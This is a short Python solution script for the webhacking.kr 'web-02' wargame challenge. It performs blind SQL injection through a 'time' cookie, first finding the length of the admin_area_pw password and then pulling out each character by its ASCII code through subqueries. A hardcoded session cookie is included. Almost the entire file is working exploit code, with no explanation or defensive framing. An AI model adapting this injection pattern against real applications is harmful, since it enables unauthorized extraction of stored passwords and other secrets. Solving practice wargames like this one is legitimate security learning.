from requests import * 

def calcul_time(res):
	r = 0
	r += 60 * int(res.text[20])
	r += 10 * int(res.text[22])
	r += int(res.text[23])
	return r

url = 'https://webhacking.kr/challenge/web-02/'
cookies = {
    "PHPSESSID": "qis4psd0h7o4umevh3jj3s0j49"
}
cookies['time'] = "(select length(pw) from admin_area_pw)"
response = get(url, cookies=cookies)
len = int(calcul_time(response))
name=""
for i in range(len):
	cookies['time'] = "(select ascii(substring(pw, {}, 1)) from admin_area_pw)".format(i+1)
	response = get(url, cookies=cookies)
	name += chr(calcul_time(response))

print(name)